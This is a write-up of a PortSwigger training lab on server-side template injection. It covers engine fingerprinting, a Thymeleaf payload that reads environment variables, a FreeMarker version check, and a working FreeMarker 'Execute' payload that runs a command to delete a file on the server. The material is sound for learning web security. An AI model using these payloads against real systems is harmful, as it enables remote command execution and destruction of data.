Link: [Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
Difficulty: Practitioner

# Recon
First, I need to identify the input which allow me to manipulate the engine code. On top of that, I need to log in with the provided credential to see whether there is any difference and it is. Under `content-manager` access, user could use the function called `Edit temnplate`. By using the edit template I could manipulate the content display of a specific item.

Let's try with some payload to check which template engine does target use?
and only `${7*7}` works which indicates it might be `thymeleaf` or other templates.

<img width="800" height="457" alt="Screenshot_20261020_165805" src="https://github.com/user-attachments/assets/b0c30a5a-e990-40d5-a111-fb0ff73c6190" />

So finding a payload for SSTI `thymeleaf` 
```
${T(java.lang.System).getenv()}
```
<img width="1187" height="780" alt="Screenshot_20261020_170054" src="https://github.com/user-attachments/assets/a31d68fc-3b1f-4abf-ac54-b64efa88c2c5" />

The error tells me that this site is currently using `FreeMarker template`. Therefore, by checking the version of the template, I could deduct my own payload to trigger arbitrary code later on.
```
<#assign freemarkerVersion = .version>
FreeMarker version: ${freemarkerVersion}
```
<img width="826" height="432" alt="Screenshot_20261020_170258" src="https://github.com/user-attachments/assets/08da40e4-ecb7-4d95-9568-67905cf38d25" />


# Action
This is the payload to delete `morale.txt` file from the site by exploiting SSTI of `FreeMarker 2.3.29`
```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

The class freemarker.template.utility.Execute in the freemarker.template.utility package provides FreeMarker with the capability to execute external commands. By utilizing this class, I can run commands within FreeMarker template.

Happy Hacking@$@$!@
